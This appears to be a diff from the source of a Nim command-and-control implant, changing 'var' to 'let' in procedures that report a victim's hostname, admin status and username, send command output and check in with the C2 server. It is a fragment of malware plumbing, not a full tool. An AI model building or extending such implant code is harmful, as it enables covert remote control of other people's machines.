@@ -4,7 +4,7 @@ proc sendData(client: Socket, data: string) =
     client.send(encode(data) & "\r\n")
 
 proc sendOutput*(client: Socket, category: string, output: string) =
-    var j = %*
+    let j = %*
         {
             "task": "output",
             "category": category,
@@ -13,7 +13,7 @@ proc sendOutput*(client: Socket, category: string, output: string) =
     client.sendData($j)
 
 proc identify*(client: Socket, hostname: string, isAdmin: bool, username: string) =
-    var j = %*
+    let j = %*
         {
             "task": "identify",
             "hostname": hostname,
@@ -23,7 +23,7 @@ proc identify*(client: Socket, hostname: string, isAdmin: bool, username: string
     client.sendData($j)
 
 proc connectToC2*(client: Socket) =
-    var j = %*
+    let j = %*
         {
             "task": "connect"
         }
